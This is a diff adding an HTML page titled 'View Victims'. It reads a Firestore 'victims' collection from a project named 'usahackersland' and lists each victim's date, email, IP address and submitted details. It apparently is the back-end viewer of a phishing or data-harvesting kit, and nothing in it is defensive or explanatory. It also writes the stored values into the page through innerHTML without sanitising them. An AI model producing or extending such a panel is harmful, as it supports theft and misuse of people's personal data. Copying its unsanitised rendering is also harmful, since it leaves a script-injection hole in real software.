@@ -1,0 +1,79 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>📍 View Victims</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
+    h2 { color: #333; margin-bottom: 20px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 12px;
+      text-align: left;
+    }
+    th { background-color: #343a40; color: white; }
+    tr:nth-child(even) { background-color: #f2f2f2; }
+    .loading { font-size: 18px; color: #555; }
+  </style>
+</head>
+<body>
+  <h2>📍 Victim Submissions</h2>
+  <div class="loading" id="loading">Loading victim data...</div>
+  <table id="victimTable" style="display:none;">
+    <thead>
+      <tr>
+        <th>📅 Date</th>
+        <th>📨 Email</th>
+        <th>📍 IP Address</th>
+        <th>📝 Details</th>
+      </tr>
+    </thead>
+    <tbody id="victimData"></tbody>
+  </table>  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "usahackersland.firebaseapp.com",
+      projectId: "usahackersland",
+      storageBucket: "usahackersland.appspot.com",
+      messagingSenderId: "588407428267",
+      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    async function loadVictims() {
+      const victimRef = collection(db, "victims");
+      const snapshot = await getDocs(victimRef);
+      const table = document.getElementById("victimTable");
+      const tbody = document.getElementById("victimData");
+      const loading = document.getElementById("loading");
+
+      if (snapshot.empty) {
+        loading.innerText = "No victim data found.";
+        return;
+      }
+
+      snapshot.forEach(doc => {
+        const data = doc.data();
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td>${data.date || "-"}</td>
+          <td>${data.email || "-"}</td>
+          <td>${data.ip || "-"}</td>
+          <td>${data.details || "-"}</td>
+        `;
+        tbody.appendChild(row);
+      });
+
+      loading.style.display = "none";
+      table.style.display = "table";
+    }
+
+    loadVictims();
+  </script></body>
+</html>
